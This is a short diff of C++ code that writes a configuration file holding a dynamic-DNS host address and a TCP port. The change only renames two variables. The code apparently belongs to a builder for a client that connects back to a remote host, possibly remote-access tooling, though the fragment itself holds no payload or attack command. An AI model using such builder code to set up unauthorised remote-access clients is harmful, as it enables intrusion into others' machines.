@@ -89,9 +89,9 @@ using namespace std ;
 	else {
 	
 	set_config << "	// NO-IP Dns Or IP Address Below:" << endl;  
-	set_config << "	char host_address[99999] = {\""<< address << "\"};"<<  endl ; 
+	set_config << "	char host[] = {\""<< address << "\"};"<<  endl ; 
 	set_config << "	// TCP PORT Below:" << endl; 
-        set_config << "	static int PORT = " << port << " ; " << endl;  
+        set_config << "	static int port = " << port << " ; " << endl;  
 	cout << " [+] Config Has Been Saved!" << endl;
 	}
 	
